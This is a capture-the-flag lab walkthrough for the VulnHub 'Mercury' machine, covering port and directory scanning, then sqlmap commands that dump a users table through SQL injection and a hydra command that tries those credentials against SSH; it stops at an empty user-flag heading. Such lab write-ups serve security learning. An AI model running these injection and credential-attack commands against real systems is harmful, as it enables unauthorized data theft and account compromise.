# MERCURY
Mercury is an easier box, with no brute-forcing required. There are two flags on the box: a user and a root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware.

- image file can be downloaded from [here](https://www.vulnhub.com/entry/the-planets-mercury,544/)

## Enumeration
- nmap scan:
![mercury_nmap](https://github.com/shybu9/vulnhub/assets/112984045/7ebc1461-7fb5-4bfd-8faa-1aaef88c3a8d)

- port scan using [personal_tool]():
![mercury_portscan](https://github.com/shybu9/vulnhub/assets/112984045/d0eb86bf-00c2-4745-ae83-351a759a7f61)

- gobuster scan:
![mercury_gobuster_comman](https://github.com/shybu9/vulnhub/assets/112984045/77323c20-aae6-4529-a7bc-f1f671ba2e4e)

### After scan analysis:
- open ports: 22 (SSH) & 8080 (HTTP_PROXY)
- web directories: /robots.txt

### Web page enumeration:
![mercury_robots](https://github.com/shybu9/vulnhub/assets/112984045/3bb9d318-d61e-4137-93fb-1b3e43fa3364)

- robots.txt disallows '*' user agent for directory '/'

```
http://192.168.188.169/*
```
![mercury_ ](https://github.com/shybu9/vulnhub/assets/112984045/fa516418-d1a9-4bf0-b902-c5f47f3e01ca)

-- directory '/mercuryfacts' seems to have an SQLI-vulnerable perimeter

```
sqlmap --url http://192.168.188.169/mercuryfacts --dbs --batch
```
![mercury_sqli_dbs](https://github.com/shybu9/vulnhub/assets/112984045/bfe70f54-59d1-4b35-b53b-8e8d819b9699)

```
sqlmap --url http://192.168.188.169/mercuryfacts -D mercury --tables --batch
```
![mercury_sqli_users](https://github.com/shybu9/vulnhub/assets/112984045/7a120954-ee73-4338-ab15-746ce2399adc)

```
sqlmap --url http://192.168.188.169/mercuryfacts -D mercury -T users --dump --batch
```
![mercury_sqli_user_pass](https://github.com/shybu9/vulnhub/assets/112984045/77c357d5-59d6-4e5a-9f0a-9595d06c1465)

- A list of usernames and passwords can be generated from this sqlmap dumps

### Finding the right credentials using hydra
```
hydra -L users_list -P pswds_list ssh://192.168.188.169
```
![mercury_hydra](https://github.com/shybu9/vulnhub/assets/112984045/d766d37a-8ec7-41d6-bdb7-f3396375f6ac)

### User Flag

